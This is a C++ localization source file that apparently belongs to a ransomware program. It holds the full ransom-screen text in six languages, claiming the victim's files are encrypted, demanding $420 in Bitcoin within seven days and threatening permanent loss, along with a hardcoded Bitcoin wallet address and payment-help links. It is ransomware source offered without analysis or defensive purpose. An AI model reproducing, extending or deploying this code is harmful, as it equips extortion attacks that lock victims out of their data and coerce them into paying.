#include "localization.hpp"
#include <stdexcept>

static const wchar_t* TEXTS[]
{
    //English
    L"Ooops, your files have been encrypted!",
    L"What Happened to My Computer?",
    L"Can I Recover My Files?",
    L"How Do I Pay?",
    L"Your important files are encrypted. Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service.",
    L"Sure. We guarantee that you can recover all your files safely and easily. But you have not so enough time. You can decrypt some of your files for free. Try now by clicking <Decrypt>. But if you want to decrypt all your files, you need to pay. You only have 7 days to submit the payment. After that your files will be lost forever!",
    L"Payment is accepted in Bitcoin only. For more information, click <What is Bitcoin?>. Please check the current price of Bitcoin and buy some bitcoins. For more information, click <How to buy bitcoins?> and send the correct amount to the address specified in this window. After your payment, click <Check Payment> button. We will check your payment and perform decryption.",
    L"Send $420 worth of Bitcoin to this address:",
    L"Your files",
    L"will be lost in:",
    L"Forever!",
    L"Decrypt",
    L"Check Payment",
    L"Copy",
    L"What is Bitcoin?",
    L"How to buy bitcoins?",

    //Polish
    L"O niee, twoje pliki zostały zaszyfrowane!",
    L"Co się stało z moim komputerem?",
    L"Czy mogę odzyskać moje pliki?",
    L"Jak dokonać płatności?",
    L"Twoje ważne pliki zostały zaszyfrowane. Wiele twoich dokumentów, zdjęć, filmów, baz danych i innych plików nie jest już dostępnych, ponieważ zostały zaszyfrowane. Może szukasz sposobu na odzyskanie swoich plików, ale nie marnuj czasu. Nikt nie może odzyskać twoich plików bez naszej usługi dekryptacji.",
    L"Oczywiście. Gwarantujemy, że możesz bezpiecznie i łatwo odzyskać wszystkie swoje pliki. Ale nie masz zbyt wiele czasu. Możesz odszyfrować niektóre ze swoich plików za darmo. Wypróbuj teraz, klikając <Odszyfruj>. Ale jeśli chcesz odszyfrować wszystkie swoje pliki, musisz zapłacić. Masz tylko 7 dni na dokonanie płatności. Po tym czasie twoje pliki zostaną utracone na zawsze!",
    L"Płatność jest akceptowana tylko w Bitcoinach. Aby uzyskać więcej informacji, kliknij <Co to jest Bitcoin?>. Sprawdź aktualną cenę Bitcoina i kup trochę bitcoinów. Aby uzyskać więcej informacji, kliknij <Jak kupić bitcoiny?> i prześlij odpowiednią kwotę na adres podany w tym oknie. Po dokonaniu płatności kliknij przycisk <Sprawdź płatność>. Sprawdzimy twoją płatność i przeprowadzimy dekryptację.",
    L"Wyślij bitcoiny o wartości 420 dolarów na ten adres:",
    L"Twoje pliki",
    L"zostaną utracone za:",
    L"Na zawsze!",
    L"Odszyfruj",
    L"Sprawdź płatność",
    L"Kopiuj",
    L"Co to jest Bitcoin?",
    L"Jak kupić bitcoiny?",

    //Spanish
    L"¡Vaya, tus archivos han sido encriptados!",
    L"¿Qué le pasó a mi computadora?",
    L"¿Puedo recuperar mis archivos?",
    L"¿Cómo pago?",
    L"Tus archivos importantes están encriptados. Muchos de tus documentos, fotos, videos, bases de datos y otros archivos ya no están disponibles porque han sido encriptados. Tal vez estás buscando una manera de recuperar tus archivos, pero no pierdas el tiempo. Nadie puede recuperar tus archivos sin nuestro servicio de descifrado.",
    L"Por supuesto.Garantizamos que puedes recuperar todos tus archivos de manera segura y fácil.Pero no tienes tanto tiempo.Puedes desencriptar algunos de tus archivos gratis.Prueba ahora haciendo clic en <Desencriptar>.Pero si quieres desencriptar todos tus archivos, necesitas pagar.Solo tienes 7 días para realizar el pago.¡Después de eso, tus archivos se perderán para siempre!",
    L"El pago se acepta solo en Bitcoin. Para más información, haz clic en <¿Qué es Bitcoin?>. Por favor, revisa el precio actual de Bitcoin y compra algunos bitcoins. Para más información, haz clic en <¿Cómo comprar bitcoins?> y envía la cantidad correcta a la dirección especificada en esta ventana. Después de tu pago, haz clic en el botón <Verificar Pago>. Revisaremos tu pago y realizaremos el descifrado.",
    L"Envía $420 en Bitcoin a esta dirección:",
    L"Tus archivos",
    L"se perderán en:",
    L"¡Para siempre!",
    L"Desencriptar",
    L"Verificar Pago",
    L"Copiar",
    L"¿Qué es Bitcoin?",
    L"¿Cómo comprar bitcoins?",

    //French
    L"Oups, vos fichiers ont été cryptés!",
    L"Qu'est-il arrivé à mon ordinateur?",
    L"Puis-je récupérer mes fichiers?",
    L"Comment puis-je payer?",
    L"Vos fichiers importants sont cryptés. Beaucoup de vos documents, photos, vidéos, bases de données et autres fichiers ne sont plus accessibles car ils ont été cryptés. Peut-être que vous cherchez un moyen de récupérer vos fichiers, mais ne perdez pas votre temps. Personne ne peut récupérer vos fichiers sans notre service de décryptage.",
    L"Bien sûr. Nous garantissons que vous pouvez récupérer tous vos fichiers en toute sécurité et facilement. Mais vous n'avez pas beaucoup de temps. Vous pouvez décrypter certains de vos fichiers gratuitement. Essayez maintenant en cliquant sur <Décrypter>. Mais si vous voulez décrypter tous vos fichiers, vous devez payer. Vous n'avez que 7 jours pour effectuer le paiement. Après cela, vos fichiers seront perdus pour toujours!",
    L"Le paiement est accepté uniquement en Bitcoin. Pour plus d'informations, cliquez sur <Qu'est-ce que Bitcoin?>. Veuillez vérifier le prix actuel du Bitcoin et acheter des bitcoins. Pour plus d'informations, cliquez sur <Comment acheter des bitcoins?> et envoyez le montant correct à l'adresse spécifiée dans cette fenêtre. Après votre paiement, cliquez sur le bouton <Vérifier le paiement>. Nous vérifierons votre paiement et procéderons au décryptage.",
    L"Envoyez pour 420 $ de Bitcoin à cette adresse:",
    L"Vos fichiers",
    L"seront perdus dans:",
    L"Pour toujours!",
    L"Décrypter",
    L"Vérifier le paiement",
    L"Copier",
    L"Qu'est-ce que Bitcoin?",
    L"Comment acheter des bitcoins?",

    //German
    L"Ooops, Ihre Dateien wurden verschlüsselt!",
    L"Was ist mit meinem Computer passiert?",
    L"Kann ich meine Dateien wiederherstellen?",
    L"Wie bezahle ich?",
    L"Ihre wichtigen Dateien sind verschlüsselt. Viele Ihrer Dokumente, Fotos, Videos, Datenbanken und andere Dateien sind nicht mehr zugänglich, weil sie verschlüsselt wurden. Vielleicht suchen Sie gerade nach einer Möglichkeit, Ihre Dateien wiederherzustellen, aber verschwenden Sie keine Zeit. Niemand kann Ihre Dateien ohne unseren Entschlüsselungsdienst wiederherstellen.",
    L"Sicher. Wir garantieren, dass Sie alle Ihre Dateien sicher und einfach wiederherstellen können. Aber Sie haben nicht viel Zeit. Sie können einige Ihrer Dateien kostenlos entschlüsseln. Versuchen Sie es jetzt, indem Sie auf <Entschlüsseln> klicken. Aber wenn Sie alle Ihre Dateien entschlüsseln möchten, müssen Sie bezahlen. Sie haben nur 7 Tage Zeit, um die Zahlung zu leisten. Danach werden Ihre Dateien für immer verloren sein!",
    L"Zahlung wird nur in Bitcoin akzeptiert. Für weitere Informationen klicken Sie auf <Was ist Bitcoin?>. Bitte überprüfen Sie den aktuellen Preis von Bitcoin und kaufen Sie einige Bitcoins. Für mehr Informationen klicken Sie auf <Wie kaufe ich Bitcoins?> und senden Sie den korrekten Betrag an die in diesem Fenster angegebene Adresse. Nach Ihrer Zahlung klicken Sie auf den Button <Zahlung überprüfen>. Wir werden Ihre Zahlung überprüfen und die Entschlüsselung durchführen.",
    L"Senden Sie Bitcoins im Wert von $420 an diese Adresse:",
    L"Ihre Dateien",
    L"werden verloren gehen in:",
    L"Für immer!",
    L"Entschlüsseln",
    L"Zahlung überprüfen",
    L"Kopieren",
    L"Was ist Bitcoin?",
    L"Wie kaufe ich Bitcoins?",

    //Russian
    L"Упс, ваши файлы были зашифрованы!",
    L"Что случилось с моим компьютером?",
    L"Могу ли я восстановить свои файлы?",
    L"Как мне заплатить?",
    L"Ваши важные файлы зашифрованы. Многие из ваших документов, фотографий, видео, баз данных и других файлов больше недоступны, потому что они были зашифрованы. Возможно, вы сейчас ищете способ восстановить ваши файлы, но не теряйте времени. Никто не может восстановить ваши файлы без нашего сервиса дешифровки.",
    L"Конечно. Мы гарантируем, что вы сможете безопасно и легко восстановить все свои файлы. Но у вас нет так много времени. Вы можете бесплатно расшифровать некоторые из ваших файлов. Попробуйте сейчас, нажав <Расшифровать>. Но если вы хотите расшифровать все свои файлы, вам нужно заплатить. У вас есть только 7 дней на осуществление платежа. После этого ваши файлы будут потеряны навсегда!",
    L"Оплата принимается только в биткойнах. Для получения дополнительной информации нажмите <Что такое Биткойн?>. Пожалуйста, проверьте текущую цену биткойна и купите некоторое количество биткойнов. Для получения дополнительной информации нажмите <Как купить биткойны?> и отправьте правильную сумму на указанный в этом окне адрес. После вашей оплаты нажмите кнопку <Проверить платеж>. Мы проверим ваш платеж и выполним дешифровку.",
    L"Отправьте биткойнов на сумму $420 на этот адрес:",
    L"Ваши файлы",
    L"будут потеряны через:",
    L"Навсегда!",
    L"Расшифровать",
    L"Проверить платеж",
    L"Копировать",
    L"Что такое Биткойн?",
    L"Как купить биткойны?",
};

#define TEXT_LINK_1 L"https://en.wikipedia.org/wiki/Bitcoin"
#define TEXT_LINK_2 L"https://www.forbes.com/advisor/investing/cryptocurrency/how-to-buy-bitcoin/"
#define TEXT_BTC_WALLET L"1JHcdV9fjJjwQj5jXyZ2j5xvJLZ9F2Xz9r"

#define LANGUAGE_TEXT_CHUNK ((sizeof(TEXTS) / sizeof(uintptr_t)) / (int(Localization::Language::COUNT) - 1))

Localization::Localization() : m_language(Localization::Language::ENGLISH)
{
}

Localization::~Localization()
{
}

bool Localization::setLanguage(const Language& lang)
{
    if (lang == m_language or lang >= Language::COUNT)
        return false;

    m_language = lang;
    return true;
}

std::wstring Localization::getTextStr(const Text& text)
{
    return getText(text);
}

const wchar_t* Localization::getText(const Text& text)
{
    if (text >= Text::COUNT or text < Text(0))
        throw std::runtime_error("Invalid text");

    switch (text)
    {
        case Text::BTC_WALLET: return TEXT_BTC_WALLET; break;
        case Text::LINK_1: return TEXT_LINK_1; break;
        case Text::LINK_2: return TEXT_LINK_2; break;
    }

    return TEXTS[((static_cast<int>(m_language) - 1) * LANGUAGE_TEXT_CHUNK) + static_cast<int>(text)];
}
